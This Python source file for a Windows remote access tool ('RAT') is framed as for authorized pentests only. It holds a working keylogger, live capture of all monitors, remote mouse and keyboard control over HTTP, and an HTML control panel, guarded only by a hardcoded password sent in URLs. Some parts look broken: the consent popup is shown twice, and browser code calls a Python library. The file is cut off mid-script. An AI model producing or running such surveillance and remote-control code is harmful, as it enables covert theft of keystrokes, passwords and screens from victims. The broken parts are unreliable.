"""
Remote Access Tool — Authorized Pentest / Red Team Exercise Only
=================================================================
WARNING: This program gives FULL remote control of the machine it runs on,
including screen viewing (ALL monitors), mouse control, and keyboard logging.

DO NOT distribute, share, or run on any machine you do not own or have
EXPLICIT WRITTEN PERMISSION to test.

This is for EDUCATIONAL / AUTHORIZED TESTING purposes only.
=================================================================
"""

import os
import sys
import io
import json
import threading
import time
import socket
import ctypes
import queue
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ─── DPI Awareness (MUST be set BEFORE any GUI/input library imports) ────
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(2)  # Per-monitor DPI aware
except Exception:
    try:
        ctypes.windll.user32.SetProcessDPIAware()  # Fallback
    except Exception:
        pass

# ─── Now import the rest ──────────────────────────────────────────────────
import pyautogui
from PIL import Image

# ─── Configuration ───────────────────────────────────────────────────────────
PORT = 5555
PANEL_PASSWORD = "pentest123"  # Change this!

# ─── Warning Popup ───────────────────────────────────────────────────────────

def show_warning():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    ctypes.windll.user32.MessageBoxW(
        0,
        f"⚠️  REMOTE ACCESS TOOL — AUTHORIZED PENTEST ONLY\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"This program will start a BACKGROUND SERVER on:\n"
        f"  http://{local_ip}:{PORT}\n\n"
        f"Anyone who connects with the correct password can\n"
        f"FULLY CONTROL this computer:\n"
        f"  • View ALL your monitors in REAL TIME\n"
        f"  • Control your mouse cursor across all screens\n"
        f"  • Click and type on your machine\n"
        f"  • Log all keystrokes pressed\n\n"
        f"ONLY run on machines you OWN or have EXPLICIT\n"
        f"WRITTEN PERMISSION to test.\n\n"
        f"Panel password: {PANEL_PASSWORD}\n\n"
        f"Click YES to start the server, NO to abort.",
        "⚠️  AUTHORIZED PENTEST TOOL — REMOTE ACCESS",
        4 | 48
    )
    # ctypes.windll.user32.MessageBoxW returns 6 for Yes, 7 for No
    result = ctypes.windll.user32.MessageBoxW(
        0,
        f"⚠️  REMOTE ACCESS TOOL — AUTHORIZED PENTEST ONLY\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"This program will start a BACKGROUND SERVER on:\n"
        f"  http://{local_ip}:{PORT}\n\n"
        f"Anyone who connects with the correct password can\n"
        f"FULLY CONTROL this computer:\n"
        f"  • View ALL your monitors in REAL TIME\n"
        f"  • Control your mouse cursor across all screens\n"
        f"  • Click and type on your machine\n"
        f"  • Log all keystrokes pressed\n\n"
        f"ONLY run on machines you OWN or have EXPLICIT\n"
        f"WRITTEN PERMISSION to test.\n\n"
        f"Panel password: {PANEL_PASSWORD}\n\n"
        f"Click YES to continue, NO to abort.",
        "⚠️  AUTHORIZED PENTEST TOOL — REMOTE ACCESS",
        4 | 48
    )
    if result != 6:
        print("[*] Aborted by user.")
        sys.exit(0)


# ─── Global State ────────────────────────────────────────────────────────────

frame_queue = queue.Queue(maxsize=10)
keylog_buffer = []
keylog_lock = threading.Lock()
running = True

# Virtual screen info (populated after DPI fix)
VIRTUAL_WIDTH = 0
VIRTUAL_HEIGHT = 0
MONITORS_INFO = []  # List of dicts with left, top, width, height

def init_display_info():
    """Get the virtual screen dimensions spanning all monitors."""
    global VIRTUAL_WIDTH, VIRTUAL_HEIGHT, MONITORS_INFO

    # Get virtual screen size (all monitors combined)
    VIRTUAL_WIDTH = ctypes.windll.user32.GetSystemMetrics(78)  # SM_CXVIRTUALSCREEN
    VIRTUAL_HEIGHT = ctypes.windll.user32.GetSystemMetrics(79)  # SM_CYVIRTUALSCREEN

    # Enumerate individual monitors
    MONITORS_INFO = []
    try:
        from mss import mss
        with mss() as sct:
            # monitors[0] is the combined virtual screen
            # monitors[1] is primary, monitors[2+] are secondary
            for i in range(1, len(sct.monitors)):
                m = sct.monitors[i]
                MONITORS_INFO.append({
                    "left": m["left"],
                    "top": m["top"],
                    "width": m["width"],
                    "height": m["height"],
                    "index": i,
                })
    except ImportError:
        # Fallback: single monitor
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        MONITORS_INFO.append({"left": 0, "top": 0, "width": w, "height": h, "index": 1})

    if not MONITORS_INFO:
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        MONITORS_INFO.append({"left": 0, "top": 0, "width": w, "height": h, "index": 1})

    print(f"  Virtual screen: {VIRTUAL_WIDTH}x{VIRTUAL_HEIGHT}")
    print(f"  Monitors detected: {len(MONITORS_INFO)}")
    for i, m in enumerate(MONITORS_INFO):
        print(f"    Monitor {i+1}: ({m['left']},{m['top']}) {m['width']}x{m['height']}")


# ─── Screen Capture Thread ───────────────────────────────────────────────────

def screen_capture_loop():
    """Continuously captures ALL monitors into one combined frame."""
    global running
    try:
        from mss import mss
        sct = mss()
        while running:
            try:
                # monitors[0] = combined virtual screen (all monitors)
                sct_img = sct.grab(sct.monitors[0])
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=65)
                frame_data = buf.getvalue()

                if frame_queue.full():
                    try:
                        frame_queue.get_nowait()
                    except queue.Empty:
                        pass
                frame_queue.put_nowait({
                    "data": frame_data,
                    "width": sct_img.size[0],
                    "height": sct_img.size[1],
                })
                time.sleep(0.04)  # ~25 FPS
            except Exception:
                time.sleep(0.1)
    except ImportError:
        # Fallback: pyautogui (single monitor only)
        while running:
            try:
                img = pyautogui.screenshot()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=65)
                frame_data = buf.getvalue()
                if frame_queue.full():
                    try:
                        frame_queue.get_nowait()
                    except queue.Empty:
                        pass
                frame_queue.put_nowait({
                    "data": frame_data,
                    "width": img.width,
                    "height": img.height,
                })
                time.sleep(0.1)
            except Exception:
                time.sleep(0.2)


# ─── Keylogger Thread ────────────────────────────────────────────────────────

def keylog_loop():
    """Logs all keyboard input — captures every keystroke reliably."""
    global running

    # Try pynput first (most reliable cross-platform)
    try:
        from pynput import keyboard

        def on_press(key):
            try:
                # Try to get the character
                if hasattr(key, 'char') and key.char is not None:
                    display = key.char
                    # Handle special whitespace
                    if display == '\r':
                        display = '[ENTER]'
                    elif display == '\t':
                        display = '[TAB]'
                    elif display == '\x08':
                        display = '[BACKSPACE]'
                    elif display == '\x1b':
                        display = '[ESC]'
                else:
                    # Special key
                    display = f'[{key.name.upper()}]'
            except Exception:
                display = f'[{str(key)}]'

            with keylog_lock:
                keylog_buffer.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "display": display,
                })
                while len(keylog_buffer) > 500:
                    keylog_buffer.pop(0)

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        while running:
            time.sleep(1)
        listener.stop()
        return
    except ImportError:
        pass

    # Fallback: ctypes keyboard hook (Windows native, captures everything)
    try:
        import pythoncom
        import pyWinhook as pyHook

        def on_keyboard_event(event):
            # Get the key name
            key_name = event.Key
            ascii_val = event.Ascii

            if ascii_val == 13:
                display = '[ENTER]'
            elif ascii_val == 9:
                display = '[TAB]'
            elif ascii_val == 8:
                display = '[BACKSPACE]'
            elif ascii_val == 27:
                display = '[ESC]'
            elif 32 <= ascii_val <= 126:
                display = chr(ascii_val)
            else:
                display = f'[{key_name}]'

            with keylog_lock:
                keylog_buffer.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "display": display,
                })
                while len(keylog_buffer) > 500:
                    keylog_buffer.pop(0)
            return True

        hm = pyHook.HookManager()
        hm.KeyDown = on_keyboard_event
        hm.HookKeyboard()
        while running:
            pythoncom.PumpWaitingMessages()
            time.sleep(0.01)
        return
    except ImportError:
        print("  [!] No keylogging library available. Install: pip install pynput")
        while running:
            time.sleep(1)


# ─── HTTP Request Handler ────────────────────────────────────────────────────

class RATHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)

        if path == "/" or path == "/panel":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(self._panel_html().encode("utf-8"))

        elif path == "/stream":
            pwd = params.get("pwd", [None])[0]
            if pwd != PANEL_PASSWORD:
                self.send_error(403)
                return

            self.send_response(200)
            self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

            # Send monitor layout info first
            layout_info = json.dumps({
                "type": "layout",
                "virtual_width": VIRTUAL_WIDTH,
                "virtual_height": VIRTUAL_HEIGHT,
                "monitors": MONITORS_INFO,
            })
            self.wfile.write(f"--frame\r\nContent-Type: application/json\r\n\r\n{layout_info}\r\n".encode())

            while True:
                try:
                    frame_data = frame_queue.get(timeout=3)
                    img_bytes = frame_data["data"]
                    self.wfile.write(b"--frame\r\n")
                    self.wfile.write(b"Content-Type: image/jpeg\r\n")
                    self.wfile.write(f"Content-Length: {len(img_bytes)}\r\n".encode())
                    self.wfile.write(b"\r\n")
                    self.wfile.write(img_bytes)
                    self.wfile.write(b"\r\n")
                except queue.Empty:
                    try:
                        self.wfile.write(b"--frame\r\nContent-Type: text/plain\r\n\r\nwaiting\r\n")
                    except Exception:
                        break
                except Exception:
                    break

        elif path == "/layout":
            # Return monitor layout info as JSON
            pwd = params.get("pwd", [None])[0]
            if pwd != PANEL_PASSWORD:
                self.send_error(403)
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            layout = {
                "virtual_width": VIRTUAL_WIDTH,
                "virtual_height": VIRTUAL_HEIGHT,
                "monitors": MONITORS_INFO,
            }
            self.wfile.write(json.dumps(layout).encode("utf-8"))

        elif path == "/keylog":
            pwd = params.get("pwd", [None])[0]
            if pwd != PANEL_PASSWORD:
                self.send_error(403)
                return
            with keylog_lock:
                data = list(keylog_buffer)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps(data).encode("utf-8"))

        elif path == "/clear_keylog":
            pwd = params.get("pwd", [None])[0]
            if pwd != PANEL_PASSWORD:
                self.send_error(403)
                return
            with keylog_lock:
                keylog_buffer.clear()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")

        else:
            self.send_error(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            data = {}

        pwd = data.get("pwd", "")
        if pwd != PANEL_PASSWORD:
            self.send_response(403)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid password")
            return

        # ── Mouse Move (uses absolute virtual screen coordinates) ──
        if path == "/mouse_move":
            x = data.get("x", 0)
            y = data.get("y", 0)
            # Clamp to virtual screen
            x = max(-VIRTUAL_WIDTH, min(VIRTUAL_WIDTH * 2, x))
            y = max(-VIRTUAL_HEIGHT, min(VIRTUAL_HEIGHT * 2, y))
            pyautogui.moveTo(x, y)

        elif path == "/mouse_click":
            x = data.get("x")
            y = data.get("y")
            button = data.get("button", "left")
            if x is not None and y is not None:
                pyautogui.click(x, y, button=button)
            else:
                pyautogui.click(button=button)

        elif path == "/mouse_doubleclick":
            x = data.get("x")
            y = data.get("y")
            if x is not None and y is not None:
                pyautogui.doubleClick(x, y)
            else:
                pyautogui.doubleClick()

        elif path == "/mouse_rightclick":
            x = data.get("x")
            y = data.get("y")
            if x is not None and y is not None:
                pyautogui.rightClick(x, y)
            else:
                pyautogui.rightClick()

        elif path == "/mouse_scroll":
            dy = data.get("dy", 0)
            pyautogui.scroll(-dy)

        # ── Drag (mousedown + move + mouseup) ──
        elif path == "/mouse_drag":
            x = data.get("x", 0)
            y = data.get("y", 0)
            button = data.get("button", "left")
            pyautogui.drag(x, y, button=button)

        elif path == "/keyboard":
            text = data.get("text", "")
            if text:
                pyautogui.write(text)

        elif path == "/key_special":
            key = data.get("key", "")
            special_map = {
                "enter": "enter", "tab": "tab", "escape": "esc",
                "backspace": "backspace", "space": "space",
                "ctrl": "ctrl", "alt": "alt", "shift": "shift",
                "win": "win", "up": "up", "down": "down",
                "left": "left", "right": "right",
                "delete": "delete", "home": "home", "end": "end",
                "pgup": "pageup", "pgdn": "pagedown",
                "f1": "f1", "f2": "f2", "f3": "f3", "f4": "f4",
                "f5": "f5", "f6": "f6", "f7": "f7", "f8": "f8",
                "f9": "f9", "f10": "f10", "f11": "f11", "f12": "f12",
                "capslock": "capslock", "numlock": "numlock",
                "scrolllock": "scrolllock", "printscreen": "printscreen",
                "pause": "pause", "insert": "insert",
                "volumeup": "volumeup", "volumedown": "volumedown",
                "mute": "volumemute",
            }
            mapped = special_map.get(key.lower(), key)
            pyautogui.press(mapped)

        elif path == "/hotkey":
            keys = data.get("keys", [])
            if keys:
                pyautogui.hotkey(*keys)

        elif path == "/shutdown":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server shutting down...")
            global running
            running = False
            threading.Thread(target=self.server.shutdown).start()
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode("utf-8"))

    def _panel_html(self):
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>RAT Control Panel — Authorized Pentest</title>
<style>
    * {{ margin:0; padding:0; box-sizing:border-box; }}
    body {{ font-family:'Segoe UI',Arial,sans-serif; background:#0a0a0f; color:#e0e0e0; overflow:hidden; }}
    #container {{ display:flex; height:100vh; }}
    #screen-area {{ flex:1; display:flex; flex-direction:column; background:#111; position:relative; overflow:hidden; }}
    #screen-wrapper {{ position:relative; width:100%; height:100%; overflow:hidden; cursor:crosshair; }}
    #screen-canvas {{ width:100%; height:100%; object-fit:contain; display:block; background:#000; }}
    #crosshair {{ position:absolute; pointer-events:none; width:20px; height:20px; border:2px solid #ff4444; border-radius:50%; transform:translate(-50%,-50%); display:none; z-index:10; }}
    #sidebar {{ width:380px; min-width:380px; background:#12121a; border-left:1px solid #2a2a3a; display:flex; flex-direction:column; padding:15px; overflow-y:auto; }}
    #sidebar h2 {{ color:#ff4444; font-size:16px; margin-bottom:10px; border-bottom:1px solid #2a2a3a; padding-bottom:8px; }}
    .section {{ margin-bottom:15px; }}
    .section-title {{ color:#888; font-size:11px; text-transform:uppercase; letter-spacing:1px; margin-bottom:6px; }}
    .btn {{ padding:8px 14px; border:none; border-radius:4px; cursor:pointer; font-size:12px; margin:2px; }}
    .btn-red {{ background:#c0392b; color:#fff; }}
    .btn-red:hover {{ background:#e74c3c; }}
    .btn-blue {{ background:#2980b9; color:#fff; }}
    .btn-blue:hover {{ background:#3498db; }}
    .btn-green {{ background:#27ae60; color:#fff; }}
    .btn-green:hover {{ background:#2ecc71; }}
    .btn-gray {{ background:#333; color:#ccc; }}
    .btn-gray:hover {{ background:#444; }}
    .btn-purple {{ background:#6c3483; color:#fff; }}
    .btn-purple:hover {{ background:#7d3c98; }}
    #keylog-box {{ flex:1; background:#0a0a0f; border:1px solid #2a2a3a; border-radius:4px; padding:8px; font-family:'Consolas','Courier New',monospace; font-size:12px; overflow-y:auto; min-height:150px; max-height:350px; color:#aaa; white-space:pre-wrap; word-break:break-all; }}
    .key-entry {{ display:inline; }}
    .key-special {{ color:#e67e22; font-weight:bold; }}
    .key-char {{ color:#2ecc71; }}
    #typing-input {{ width:100%; padding:8px; background:#1a1a2a; border:1px solid #333; color:#e0e0e0; border-radius:4px; font-size:13px; }}
    .status-dot {{ display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }}
    .status-connected {{ background:#2ecc71; }}
    .status-disconnected {{ background:#e74c3c; }}
    #connection-status {{ margin-bottom:10px; font-size:12px; }}
    #mouse-coords {{ position:absolute; bottom:10px; left:10px; background:rgba(0,0,0,0.7); color:#aaa; font-size:11px; padding:4px 8px; border-radius:3px; font-family:monospace; z-index:20; pointer-events:none; }}
    #monitor-info {{ position:absolute; bottom:10px; right:10px; background:rgba(0,0,0,0.7); color:#888; font-size:10px; padding:4px 8px; border-radius:3px; z-index:20; pointer-events:none; text-align:right; }}
    .hotkeys-grid {{ display:grid; grid-template-columns:repeat(4,1fr); gap:3px; }}
    .hotkeys-grid .btn {{ font-size:10px; padding:5px; }}
    .action-row {{ display:flex; gap:4px; flex-wrap:wrap; }}
    ::-webkit-scrollbar {{ width:6px; }} ::-webkit-scrollbar-track {{ background:#1a1a2a; }} ::-webkit-scrollbar-thumb {{ background:#333; border-radius:3px; }}
    #warning-banner {{ background:#2c0a0a; border:1px solid #c0392b; color:#ff6666; padding:8px; border-radius:4px; font-size:11px; margin-bottom:12px; text-align:center; }}
    .monitor-badge {{ display:inline-block; background:#2a2a3a; color:#aaa; font-size:10px; padding:2px 6px; border-radius:3px; margin:1px; }}
</style>
</head>
<body>
<div id="container">
    <div id="screen-area">
        <div id="screen-wrapper">
            <img id="screen-canvas" src="" alt="Connecting...">
            <div id="crosshair"></div>
            <div id="mouse-coords">X: 0, Y: 0</div>
            <div id="monitor-info">Loading monitors...</div>
        </div>
    </div>
    <div id="sidebar">
        <div id="warning-banner">⚠️ AUTHORIZED PENTEST — This machine is under remote control</div>

        <div id="connection-status">
            <span class="status-dot status-disconnected" id="status-dot"></span>
            <span id="status-text">Connecting...</span>
        </div>

        <div class="section">
            <div class="section-title">Mouse Control</div>
            <div class="action-row">
                <button class="btn btn-red" onclick="sendClick('left')">Left Click</button>
                <button class="btn btn-blue" onclick="sendClick('right')">Right Click</button>
                <button class="btn btn-gray" onclick="sendDblClick()">Double Click</button>
            </div>
            <div style="margin-top:4px;">
                <button class="btn btn-purple" onclick="toggleDragMode()" id="drag-btn">Enable Drag Mode</button>
                <span style="font-size:10px;color:#666;margin-left:4px;" id="drag-status">OFF</span>
            </div>
        </div>

        <div class="section">
            <div class="section-title">Keyboard — Type Text</div>
            <input type="text" id="typing-input" placeholder="Type here and press Enter..." onkeydown="if(event.key==='Enter')sendType()">
            <div style="margin-top:4px;">
                <button class="btn btn-green" onclick="sendType()" style="font-size:11px;">Send Text</button>
                <button class="btn btn-gray" onclick="document.getElementById('typing-input').value=''" style="font-size:11px;">Clear</button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">Special Keys / Hotkeys</div>
            <div class="hotkeys-grid">
                <button class="btn btn-gray" onclick="sendSpecial('enter')">Enter</button>
                <button class="btn btn-gray" onclick="sendSpecial('tab')">Tab</button>
                <button class="btn btn-gray" onclick="sendSpecial('escape')">Esc</button>
                <button class="btn btn-gray" onclick="sendSpecial('backspace')">⌫</button>
                <button class="btn btn-gray" onclick="sendSpecial('delete')">Del</button>
                <button class="btn btn-gray" onclick="sendSpecial('space')">Space</button>
                <button class="btn btn-gray" onclick="sendSpecial('up')">↑</button>
                <button class="btn btn-gray" onclick="sendSpecial('down')">↓</button>
                <button class="btn btn-gray" onclick="sendSpecial('left')">←</button>
                <button class="btn btn-gray" onclick="sendSpecial('right')">→</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','c'])">Ctrl+C</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','v'])">Ctrl+V</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','x'])">Ctrl+X</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','a'])">Ctrl+A</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','z'])">Ctrl+Z</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','y'])">Ctrl+Y</button>
                <button class="btn btn-gray" onclick="sendHotkey(['alt','tab'])">Alt+Tab</button>
                <button class="btn btn-gray" onclick="sendHotkey(['alt','f4'])">Alt+F4</button>
                <button class="btn btn-gray" onclick="sendHotkey(['ctrl','shift','esc'])">Task Mgr</button>
                <button class="btn btn-gray" onclick="sendHotkey(['win','d'])">Win+D</button>
                <button class="btn btn-gray" onclick="sendHotkey(['win','r'])">Win+R</button>
                <button class="btn btn-gray" onclick="sendHotkey(['win','e'])">Explorer</button>
                <button class="btn btn-gray" onclick="sendHotkey(['win','l'])">Lock</button>
                <button class="btn btn-gray" onclick="sendSpecial('printscreen')">PrtSc</button>
                <button class="btn btn-gray" onclick="sendSpecial('capslock')">Caps</button>
            </div>
        </div>

        <div class="section">
            <div class="section-title">Keystroke Log <span style="color:#666;font-weight:normal;font-size:10px;">(live capture)</span></div>
            <div id="keylog-box">Waiting for keystrokes...</div>
            <div style="margin-top:4px;display:flex;gap:4px;">
                <button class="btn btn-blue" onclick="clearKeylog()" style="font-size:11px;flex:1;">Clear Log</button>
                <button class="btn btn-blue" onclick="toggleAutoScroll()" style="font-size:11px;flex:1;" id="autoscroll-btn">Auto-Scroll: ON</button>
            </div>
        </div>

        <div class="section" style="margin-top:auto;padding-top:10px;border-top:1px solid #2a2a3a;">
            <button class="btn btn-red" onclick="shutdownServer()" style="width:100%;font-size:12px;">⏻ Shutdown Server</button>
        </div>
    </div>
</div>

<script>
const PWD = "{PANEL_PASSWORD}";
const BASE = window.location.origin;
let imgW = 0, imgH = 0;
let mouseDown = false;
let dragMode = false;
let autoScroll = true;
let virtualW = 0, virtualH = 0;
let displayRatio = 1;

// ── Screen Stream ──
const canvas = document.getElementById('screen-canvas');
const crosshair = document.getElementById('crosshair');
const coords = document.getElementById('mouse-coords');
const monitorInfo = document.getElementById('monitor-info');

function startStream() {{
    canvas.src = `${{BASE}}/stream?pwd=${{PWD}}&t=${{Date.now()}}`;
    setStatus(true);
}}

canvas.onerror = function() {{
    setStatus(false);
    setTimeout(startStream, 2000);
}};

canvas.onload = function() {{
    imgW = this.naturalWidth;
    imgH = this.naturalHeight;
    displayRatio = imgW / this.clientWidth;
    setStatus(true);
    updateMonitorInfo();
}};

function setStatus(connected) {{
    const dot = document.getElementById('status-dot');
    const txt = document.getElementById('status-text');
    dot.className = 'status-dot ' + (connected ? 'status-connected' : 'status-disconnected');
    txt.textContent = connected ? 'Connected ✓' : 'Reconnecting...';
}}

function updateMonitorInfo() {{
    monitorInfo.textContent = `${{imgW}}×${{imgH}} | ${{virtualW}}×${{virtualH}} virtual`;
}}

// ── Fetch monitor layout ──
fetch(`${{BASE}}/layout?pwd=${{PWD}}`)
    .then(r => r.json())
    .then(layout => {{
        virtualW = layout.virtual_width;
        virtualH = layout.virtual_height;
        updateMonitorInfo();
        if (layout.monitors) {{
            let info = layout.monitors.map((m,i) =>
                `M${{i+1}}: (${{m.left}},${{m.top}}) ${{m.width}}×${{m.height}}`
            ).join(' | ');
            monitorInfo.textContent = `${{imgW}}×${{imgH}} | ${{info}}`;
        }}
    }})
    .catch(() => {{}});

// ── Mouse Interaction ──
const wrapper = document.getElementById('screen-wrapper');

function getVirtualCoords(clientX, clientY) {{
    const rect = wrapper.getBoundingClientRect();
    const scaleX = imgW / rect.width;
    const scaleY = imgH / rect.height;
    const virtX = Math.round((clientX - rect.left) * scaleX) - Math.floor(virtualW / 2);
    const virtY = Math.round((clientY - rect.top) * scaleY) - Math.floor(virtualH / 2);
    return {{ x: virtX, y: virtY }};
}}

function getAbsoluteCoords(clientX, clientY) {{
    const rect = wrapper.getBoundingClientRect();
    const scaleX = imgW / rect.width;
    const scaleY = imgH / rect.height;
    const x = Math.round((clientX - rect.left) * scaleX);
    const y = Math.round((clientY - rect.top) * scaleY);
    return {{ x, y }};
}}

wrapper.addEventListener('mousemove', function(e) {{
    const rect = wrapper.getBoundingClientRect();
    const scaleX = imgW / rect.width;
    const scaleY = imgH / rect.height;
    const absX = Math.round((e.clientX - rect.left) * scaleX);
    const absY = Math.round((e.clientY - rect.top) * scaleY);

    crosshair.style.display = 'block';
    crosshair.style.left = (e.clientX - rect.left) + 'px';
    crosshair.style.top = (e.clientY - rect.top) + 'px';
    coords.textContent = `X: ${{absX}}, Y: ${{absY}}`;

    if (mouseDown && !dragMode) {{
        sendMouseMove(absX, absY);
    }}
}});

wrapper.addEventListener('mousedown', function(e) {{
    mouseDown = true;
    const rect = wrapper.getBoundingClientRect();
    const scaleX = imgW / rect.width;
    const scaleY = imgH / rect.height;
    const absX = Math.round((e.clientX - rect.left) * scaleX);
    const absY = Math.round((e.clientY - rect.top) * scaleY);

    if (dragMode) {{
        // In drag mode: first click moves and starts drag
        sendMouseMove(absX, absY);
        pyautogui.mouseDown(absX, absY, e.button === 2 ? 'right' : 'left');
        return;
    }}

    sendMouseMove(absX, absY);
    const btn = e.button === 2 ? 'right' : 'left';
    fetch(BASE + '/mouse_click', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, x:absX, y:absY, button:btn}})
    }});
}});

wrapper.addEventListener('mouseup', function(e) {{
    if (dragMode && mouseDown) {{
        const rect = wrapper.getBoundingClientRect();
        const scaleX = imgW / rect.width;
        const scaleY = imgH / rect.height;
        const absX = Math.round((e.clientX - rect.left) * scaleX);
        const absY = Math.round((e.clientY - rect.top) * scaleY);
        sendMouseMove(absX, absY);
        pyautogui.mouseUp(absX, absY, e.button === 2 ? 'right' : 'left');
    }}
    mouseDown = false;
}});

wrapper.addEventListener('mouseleave', function() {{
    crosshair.style.display = 'none';
    mouseDown = false;
}});

wrapper.addEventListener('wheel', function(e) {{
    e.preventDefault();
    fetch(BASE + '/mouse_scroll', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, dx:e.deltaX, dy:e.deltaY}})
    }});
}});

wrapper.addEventListener('contextmenu', function(e) {{ e.preventDefault(); }});

// ── API Calls ──
function sendMouseMove(x, y) {{
    fetch(BASE + '/mouse_move', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, x:x, y:y}})
    }});
}}

function sendClick(button) {{
    fetch(BASE + '/mouse_click', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, button:button}})
    }});
}}

function sendDblClick() {{
    const rect = wrapper.getBoundingClientRect();
    const scaleX = imgW / rect.width;
    const scaleY = imgH / rect.height;
    const cx = Math.round(rect.width/2 * scaleX);
    const cy = Math.round(rect.height/2 * scaleY);
    fetch(BASE + '/mouse_doubleclick', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, x:cx, y:cy}})
    }});
}}

function toggleDragMode() {{
    dragMode = !dragMode;
    document.getElementById('drag-btn').textContent = dragMode ? 'Disable Drag Mode' : 'Enable Drag Mode';
    document.getElementById('drag-status').textContent = dragMode ? 'ON — drag to draw/move' : 'OFF';
    document.getElementById('drag-status').style.color = dragMode ? '#e67e22' : '#666';
}}

function sendType() {{
    const input = document.getElementById('typing-input');
    if (input.value) {{
        fetch(BASE + '/keyboard', {{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body: JSON.stringify({{pwd:PWD, text:input.value}})
        }});
        input.value = '';
    }}
}}

function sendSpecial(key) {{
    fetch(BASE + '/key_special', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, key:key}})
    }});
}}

function sendHotkey(keys) {{
    fetch(BASE + '/hotkey', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{pwd:PWD, keys:keys}})
    }});
}}

// ── Keylog ──
function fetchKeylog() {{
    fetch(BASE + '/keylog?pwd=' + PWD)
        .then(r => r.json())
        .then(data => {{
            const box = document.getElementById('keylog-box');
            if (data.length === 0) {{
                box.innerHTML = '<span style="color:#666">No keystrokes logged yet...</span>';
                return;
            }}
            // Build a continuous text flow
            let html = '';
            let lineLen = 0;
            for (const k of data) {{
                const d = k.display;
                if (d.startsWith('[')) {{
                    html += `<span class="key-special">${{d.replace(/</g,'&lt;').replace(/>/g,'&gt;')}}</span>`;
                    lineLen += d.length;
                }} else {{
                    const escaped = d.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/ /g,'&nbsp;');
                    html += `<span class="key-char">${{escaped}}</span>`;
                    lineLen++;
                }}
                // Wrap long lines
                if (lineLen > 80) {{
                    html += '<br>';
                    lineLen = 0;
                }}
            }}
            box.innerHTML = html;
            if (autoScroll) box.scrollTop = box.scrollHeight;
        }})
        .catch(() => {{}});
}}

function clearKeylog() {{
    fetch(BASE + '/clear_keylog?pwd=' + PWD)
        .then(() => {{
            document.getElementById('keylog-box').innerHTML = '<span style="color:#666">Log cleared.</span>';
        }});
}}

function toggleAutoScroll() {{
    autoScroll = !autoScroll;
    document.getElementById('autoscroll-btn').textContent = autoScroll ? 'Auto-Scroll: ON' : 'Auto-Scroll: OFF';
}}

function shutdownServer() {{
    if (confirm('⚠️ Shutdown the RAT server on the target machine?')) {{
        fetch(BASE + '/shutdown', {{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body: JSON.stringify({{pwd:PWD}})
        }}).then(() => {{
